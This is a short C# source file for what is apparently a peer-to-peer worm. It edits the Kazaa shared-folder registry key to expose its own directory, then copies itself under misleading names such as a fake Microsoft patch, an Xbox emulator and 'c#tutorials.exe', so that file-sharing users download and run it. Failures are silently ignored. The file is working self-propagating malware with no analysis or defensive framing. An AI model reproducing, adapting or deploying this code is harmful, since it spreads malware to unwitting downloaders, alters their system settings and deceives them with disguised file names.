using System.IO;
using System.Reflection;
using Microsoft.Win32;

internal class p2pnetwrm
{
	public static void Main()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Kazaa\\LocalContent", writable: true);
		registryKey.SetValue("Dir0", "012345:" + Directory.GetCurrentDirectory());
		Module module = Assembly.GetExecutingAssembly().GetModules()[0];
		string[] array = new string[8] { "netwrmhack.exe", "xboxnetwrmemulator.exe", "linuxnetwrm.exe", "dosnetwrm.exe", "microsoftnetwrmpatch.exe", "sha1.exe", "tripleDES.exe", "c#tutorials.exe" };
		string[] array2 = array;
		foreach (string destFileName in array2)
		{
			try
			{
				File.Copy(module.FullyQualifiedName, destFileName);
			}
			catch
			{
			}
		}
	}
}
